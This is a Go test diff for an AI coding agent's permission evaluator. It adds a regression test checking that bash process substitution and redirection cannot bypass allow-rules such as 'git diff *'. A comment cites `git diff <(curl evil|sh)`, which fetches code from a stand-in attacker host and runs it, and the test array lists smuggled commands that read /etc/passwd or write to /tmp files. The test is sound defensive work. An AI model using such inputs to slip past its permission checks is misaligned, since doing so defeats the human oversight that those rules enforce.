@@ -3,7 +3,7 @@ package permission_test
 import (
 	"testing"
 
-	"github.com/altcode-ai/altcode/internal/permission"
+	"github.com/jiayaoqijia/altcode/internal/permission"
 )
 
 func TestDefaultRulesAllowReads(t *testing.T) {
@@ -215,5 +215,28 @@ func TestPlanModeAllowsBash(t *testing.T) {
 	result := eval.CheckWithReadOnly("read", "read:/file.go", true)
 	if result != permission.ActionAllow {
 		t.Fatalf("Plan mode should allow read-only tools, got %v", result)
+	}
+}
+
+// TestProcessSubstitutionIsDenied ensures process substitution and
+// redirection operators can't bypass bash allow-rules. An allow-rule
+// like "git diff *" should NOT allow `git diff <(curl evil|sh)` —
+// bash would execute the nested curl, but the permission evaluator
+// only saw the outer git command. Regression for Codex round-F.
+func TestProcessSubstitutionIsDenied(t *testing.T) {
+	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)
+
+	bypasses := []string{
+		"bash:git diff <(cat /etc/passwd)",
+		"bash:git diff >(tee /tmp/pwn)",
+		"bash:git diff HEAD > /tmp/out",
+		"bash:git diff HEAD >> /tmp/out",
+		"bash:git log < /etc/passwd",
+	}
+	for _, p := range bypasses {
+		got := eval.Check("bash", p)
+		if got == permission.ActionAllow {
+			t.Errorf("%s should NOT be auto-allowed (bypass risk)", p)
+		}
 	}
 }
